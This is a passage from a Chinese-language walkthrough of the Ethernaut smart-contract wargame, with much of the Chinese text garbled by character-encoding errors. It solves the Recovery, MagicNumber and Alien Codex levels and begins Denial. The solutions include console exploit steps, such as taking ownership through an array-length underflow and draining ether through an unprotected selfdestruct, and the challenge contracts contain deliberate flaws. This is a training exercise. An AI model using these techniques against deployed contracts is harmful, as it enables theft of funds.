<span class="w">  </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// constructor</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_creator</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_name</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_creator</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// collect ether in return for tokens</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// allow transfers of tokens</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// clean up after ourselves</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">destroy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">_to</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Â∑≤Áü•ÂêàÁ∫¶ <code>Recovery</code> ÁöÑÂú∞ÂùÄÔºåÈúÄË¶ÅÊÅ¢Â§çÂÖ∂‰∏≠ÂàõÂª∫ÁöÑÂêàÁ∫¶ <code>SimpleToken</code> ÈáåÁöÑ‰ª•Â§™Ôºå‰ΩÜÂêàÁ∫¶ <code>SimpleToken</code> ÂàõÂª∫ÂêéÊ≤°ÊúâËµãÂÄºÁªôÂèòÈáè</li>
<li>‰∏çËøá‰ø°ÊÅØÈÉΩÊòØÂÖ¨ÂºÄÁöÑÂòõÔºÅ‰ΩøÁî®ÂêàÁ∫¶ <code>Recovery</code> ÁöÑÂú∞ÂùÄÂú® <a href="https://goerli.etherscan.io/address/0x518c2143bdd79d3bc060bc4883d92d545d3e3bb0#internaltx">Etherscan</a> ÊâæÂà∞‰∫§Êòì‰ø°ÊÅØÔºåÂÖ∂‰∏≠Â∞±ÂåÖÊã¨ÂêàÁ∫¶ÂàõÂª∫ Œ¶œâŒ¶ ÂêàÁ∫¶ <code>SimpleToken</code> ÂÆû‰æãÁöÑÂú∞ÂùÄ GET ‚úîÔ∏è <br>
<img alt="Contract Creation" src="../img/ethernaut06.jpg" /></li>
<li>Âú® Remix Ê∑ªÂä†ÂêàÁ∫¶ <code>SimpleToken</code> ÁöÑÊ∫êÁ†ÅÔºåÈÄöËøá <code>At Address</code> ÂºïÁî®ÂêàÁ∫¶<br>
<img alt="At Address" src="../img/ethernaut07.jpg" /></li>
<li>Êé•‰∏ãÊù•Ë∞ÉÁî® <code>destroy</code> ÂáΩÊï∞Â∞±ÂèØ‰ª•ÂèñÂõû‰ª•Â§™Âï¶ XD</li>
<li>
<p>ÂÆûÈôÖ‰∏äÔºåÂêàÁ∫¶Âú∞ÂùÄÈÉΩÊòØÁ°ÆÂÆöÊÄßÁöÑÔºåÈÄöËøáÂêàÁ∫¶ÂàõÂª∫ËÄÖÔºà<code>sender</code>ÔºâÁöÑÂú∞ÂùÄ <code>address</code> ‰ª•ÂèäÁî±ÂàõÂª∫ËÄÖÂèëËµ∑ÁöÑ‰∫§ÊòìÁöÑÊï∞Èáè <code>nonce</code> ËÆ°ÁÆóËé∑Âæó</p>
<ul>
<li>Ê†πÊçÆ <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification">EIP 161</a>ÔºåÂàùÂßã <code>nonce</code> ‰∏∫ <span class="arithmatex">\(1\)</span></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">rlp</span>
<span class="kn">from</span> <span class="nn">eth_utils</span> <span class="kn">import</span> <span class="n">keccak</span><span class="p">,</span> <span class="n">to_checksum_address</span><span class="p">,</span> <span class="n">to_bytes</span>

<span class="k">def</span> <span class="nf">mk_contract_address</span><span class="p">(</span><span class="n">sender</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">nonce</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">  </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">  Create a contract address using eth-utils.</span>
<span class="sd">  &quot;&quot;&quot;</span>
  <span class="n">sender_bytes</span> <span class="o">=</span> <span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">sender</span><span class="p">)</span>
  <span class="n">address_bytes</span> <span class="o">=</span> <span class="n">keccak</span><span class="p">(</span><span class="n">rlp</span><span class="o">.</span><span class="n">encode</span><span class="p">([</span><span class="n">sender_bytes</span><span class="p">,</span> <span class="n">nonce</span><span class="p">]))[</span><span class="mi">12</span><span class="p">:]</span>
  <span class="k">return</span> <span class="n">to_checksum_address</span><span class="p">(</span><span class="n">address_bytes</span><span class="p">)</span>

<span class="n">mk_contract_address</span><span class="p">(</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="s2">&quot;0x518C2143bDd79d3bc060BC4883d92D545D3E3bb0&quot;</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
<span class="c1"># 0x53D144BcF44de3DeE630b1CFEabD91AC3d3caF5a</span>
</code></pre></div>
</li>
<li>
<p>Âõ†Ê≠§ÔºåÂèØ‰ª•Â∞Ü‰ª•Â§™Â∏ÅÂèëÈÄÅÂà∞È¢ÑÁ°ÆÂÆöÁöÑÂú∞ÂùÄÔºåÈöèÂêéÂú®ÊåáÂÆöÂú∞ÂùÄÂàõÂª∫ÂêàÁ∫¶Êù•ÊÅ¢Â§ç‰ª•Â§™Â∏ÅÔºåÂÆûÁé∞Êó†ÁßÅÈí•‰øùÂ≠ò‰ª•Â§™Â∏Å</p>
</li>
</ul>
<h3 id="_13">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">How is the address of an Ethereum contract computed?</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/6429/normal-transactions-vs-internal-transactions-in-etherscan">Normal transactions VS. Internal transactions in etherscan - Ethereum Stack Exchange</a></li>
</ul>
<h2 id="18-magicnumber">18. MagicNumber<a class="headerlink" href="#18-magicnumber" title="Permanent link">&para;</a></h2>
<ul>
<li>ÈÉ®ÁΩ≤ÂêàÁ∫¶ <code>Solver</code>ÔºåÂåÖÂê´ÂáΩÊï∞ <code>whatIsTheMeaningOfLife()</code>ÔºåÈúÄË¶ÅËøîÂõûÊ≠£Á°ÆÁöÑÊï∞ÔºåÂç≥ <code>42</code></li>
<li>‰ª£Á†ÅÊúÄÂ§öÂè™ËÉΩÂåÖÂê´ 10 ‰∏™Êìç‰ΩúÁ†ÅÔºåÂèØËÉΩÈúÄË¶Å‰∫∫Â∑•ÁºñÂÜô EVM Â≠óËäÇÁ†Å üò±</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">MagicNum</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">solver</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSolver</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_solver</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">solver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_solver</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="cm">/*</span>
<span class="cm">    ____________/\\\_______/\\\\\\\\\_____        </span>
<span class="cm">     __________/\\\\\_____/\\\///////\\\___       </span>
<span class="cm">      ________/\\\/\\\____\///______\//\\\__      </span>
<span class="cm">       ______/\\\/\/\\\______________/\\\/___     </span>
<span class="cm">        ____/\\\/__\/\\\___________/\\\//_____    </span>
<span class="cm">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span>
<span class="cm">          _\///////////\\\//____/\\\/___________  </span>
<span class="cm">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span>
<span class="cm">            ___________\///_____\///////////////__</span>
<span class="cm">  */</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>EVM ÊâßË°åÂ≠óËäÇÁ†ÅÔºåÂπ∂‰∏çÁü•ÈÅìÂáΩÊï∞Âêç„ÄÅÂèÇÊï∞ÂêçÁ≠â‰ø°ÊÅØ</li>
<li>ÈÄöËøá ABIÔºåÂÖ∂ÂÆÉÂêàÁ∫¶ËÉΩÂ§üË∞ÉÁî®ÊåáÂÆöÂêàÁ∫¶ÁöÑÂáΩÊï∞</li>
<li>
<p>Êó†ËÆ∫Ë¢´Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÂêçÊòØ‰ªÄ‰πàÈÉΩÂ∞ÜËøîÂõû <span class="arithmatex">\(42\)</span> ÁöÑÂêàÁ∫¶ üëáüèª</p>
<div class="highlight"><pre><span></span><code>60 0a
60 0c
60 00
39  // copy code into memory
60 0a
60 00
f3  // return code

60 2a
60 00
52  // push 42 into memory
60 20
60 00
f3  // return
</code></pre></div>
</li>
<li>
<p>Áî±Â§ñÈÉ®Ë¥¶Êà∑ÂèëËµ∑Ê≤°Êúâ <code>to</code> Âú∞ÂùÄÁöÑËΩ¨Ë¥¶‰∫§ÊòìÔºåÂπ∂Â∞ÜÂêàÁ∫¶ÁöÑ bytecode ÊîæÂú® <code>data</code> ÂüüÂç≥ÂèØÂàõÂª∫ÂêàÁ∫¶</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nx">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;600a600c600039600a6000f3602a60005260206000f3&quot;</span><span class="p">;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;from&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">player</span><span class="p">})</span>
<span class="nb">Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">blockHash</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x91be4e10a259695dc64e5feea7b875135dfc3f96f1b649554761514f4282c815&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">blockNumber</span><span class="o">:</span><span class="w"> </span><span class="mf">8034615</span><span class="p">,</span><span class="w"> </span><span class="nx">contractAddress</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Êé•‰∏ãÊù•Ë∞ÉÁî®ÂÆû‰æãÁöÑ <code>setSolver</code> Â∞±Â•ΩÂï¶ =v=</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">setSolver</span><span class="p">(</span><span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span><span class="p">);</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">solver</span><span class="p">();</span>
<span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span>
</code></pre></div>
</li>
</ul>
<h3 id="_14">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://www.ethervm.io/">Ethereum Virtual Machine Opcodes</a></li>
<li><a href="https://hackmd.io/@e18r/r1yM3rCCd">EVM bytecode programming - HackMD</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/234/what-is-an-abi-and-why-is-it-needed-to-interact-with-contracts">evm - What is an ABI and why is it needed to interact with contracts? - Ethereum Stack Exchange</a></li>
</ul>
<h2 id="19-alien-codex">19. Alien Codex<a class="headerlink" href="#19-alien-codex" title="Permanent link">&para;</a></h2>
<p>Â£∞ÊòéÂØπÂêàÁ∫¶ÂÆû‰æãÁöÑÊâÄÊúâÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.5.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;../helpers/Ownable-05.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">AlienCodex</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">contact</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="p">[]</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">codex</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">contacted</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">assert</span><span class="p">(</span><span class="nx">contact</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">make_contact</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">contact</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">record</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_content</span><span class="p">)</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_content</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">retract</span><span class="p">()</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">revise</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_content</span><span class="p">)</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_content</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÂêàÁ∫¶ÁªßÊâø‰∏≠ÔºåÁà∂ÂêàÁ∫¶ <a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/Ownable-05.sol"><code>Ownable</code></a> ÁöÑ‰ª£Á†ÅÂ∞ÜÂÖ®ÈÉ®Êã∑Ë¥ùËá≥Â≠êÂêàÁ∫¶ <code>AlienCodex</code>ÔºåÂåÖÊã¨ÂèòÈáè <code>owner</code></li>
<li>Ê†πÊçÆÊèêÁ§∫ <code>Understanding how array storage works</code>ÔºåÊòæÁÑ∂ÈáçÁÇπÂú®Êï∞ÁªÑ <code>codex</code> ‰∏ä</li>
<li>
<p>Âä®ÊÄÅÊï∞ÁªÑ‰∏éÈùôÊÄÅÂèòÈáèÁöÑÂ≠òÂÇ®ÊñπÂºèÔºàÂèØÂèÇËÄÉ <a href="#12-privacy">Privacy</a>Ôºâ‰∏çÂêåÔºå‰ΩÜ‰ªçÊ†πÊçÆÈùôÊÄÅÂèòÈáèÁöÑÂ≠òÂÇ®ËßÑÂàôÂç†Áî®‰∏Ä‰∏™ <code>slot p</code>ÔºåÁî®‰∫éÂ≠òÂÇ®Êï∞ÁªÑÈïøÂ∫¶ÔºåÊï∞ÁªÑÂÅèÁßªÈáè‰∏∫ <code>keccak(p)</code>ÔºåÊï∞ÁªÑÂÖÉÁ¥†ÁöÑÂ≠òÂÇ®ÊñπÂºè‰∏éÈùôÊÄÅÊï∞ÁªÑÁõ∏Âêå</p>
<ul>
<li>Êï∞ÁªÑÂÖÉÁ¥†ÂÅèÁßªÈáè‰∏∫ <code>keccak(p) + (index * elementSize)</code></li>
<li>
<p><code>codex</code> Âç†Áî® <code>slot 1</code>ÔºåËÆ°ÁÆóÊï∞ÁªÑÂÅèÁßªÈáè</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">soliditySha3</span><span class="p">({</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;uint&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">})</span>
<span class="s2">&quot;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&quot;</span>
</code></pre></div>
</li>
</ul>
</li>
<li>
<p>Âú∞ÂùÄÈïøÂ∫¶‰∏∫ 32 Â≠óËäÇÔºåÊâÄ‰ª•ÊÄªÂÖ±Êúâ <span class="arithmatex">\(2^{256}\)</span> ‰∏™ slotÔºåÈÇ£‰πàÔºåÊÉ≥Ë¶Å‰øÆÊîπ <code>slot 0</code> ÁöÑ <code>owner</code>ÔºåÈúÄË¶Å‰øÆÊîπ‰∏ãÊ†á‰∏∫ <code>0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</code> ÁöÑÊï∞ÁªÑÂÖÉÁ¥†</p>
</li>
<li>
<p>Êìç‰ΩúÊï∞ÁªÑ <code>codex</code> ÈúÄË¶Å <code>contact</code> ‰∏∫ <code>true</code></p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">make_contact</span><span class="p">()</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">contact</span><span class="p">()</span>
<span class="kc">true</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&quot;</span>
<span class="c1">// slot 0 Â≠òÂÇ®‰∫ÜÂèòÈáè owner Âíå contact ÁöÑÂÄº</span>
</code></pre></div>
</li>
<li>
<p>‰ΩøÁî® <code>retract</code> ‰ΩøÊï∞ÁªÑÈïøÂ∫¶‰∏ãÊ∫¢Âá∫Ôºå‰ªéËÄåËÉΩ‰øÆÊîπÁõÆÊ†á‰∏ãÊ†áÁöÑÂÖÉÁ¥†</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">retract</span><span class="p">();</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="s2">&quot;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;</span>
</code></pre></div>
</li>
<li>
<p>‰øÆÊîπ <code>owner</code></p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">revise</span><span class="p">(</span><span class="s2">&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x0000000000000000000000017Fb8134848aDe56fF213eC49edBbB1D830853289&quot;</span><span class="p">);</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="s2">&quot;0x0000000000000000000000017fb8134848ade56ff213ec49edbbb1d830853289&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">();</span>
<span class="s2">&quot;0x7Fb8134848aDe56fF213eC49edBbB1D830853289&quot;</span>
</code></pre></div>
</li>
</ul>
<h3 id="_15">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/v0.5.0/contracts.html#inheritance">Inheritance</a></li>
<li><a href="https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html">Layout of State Variables in Storage</a></li>
<li><a href="https://solidity-by-example.org/hacks/accessing-private-data/">Accessing Private Data | Solidity by Example</a></li>
</ul>
<h2 id="20-denial">20. Denial<a class="headerlink" href="#20-denial" title="Permanent link">&para;</a></h2>
<p>ÈòªÊ≠¢ <code>owner</code> Âú®ÊäïËµÑ‰∫∫Ë∞ÉÁî® <code>withdraw()</code> Êó∂Ëé∑Âà©</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Denial</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">partner</span><span class="p">;</span><span class="w"> </span><span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">timeLastWithdrawn</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">withdrawPartnerBalances</span><span class="p">;</span><span class="w"> </span><span class="c1">// keep track of partners balances</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_partner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">partner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_partner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// withdraw 1% to recipient and 1% to owner</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amountToSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// perform a call without checking return</span>
<span class="w">        </span><span class="c1">// The recipient can revert, the owner will still get their share</span>
<span class="w">        </span><span class="nx">partner</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">amountToSend</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// keep track of last withdrawal time</span>
<span class="w">        </span><span class="nx">timeLastWithdrawn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
<span class="w">        </span><span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w">  </span><span class="nx">amountToSend</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// allow deposit of funds</span>
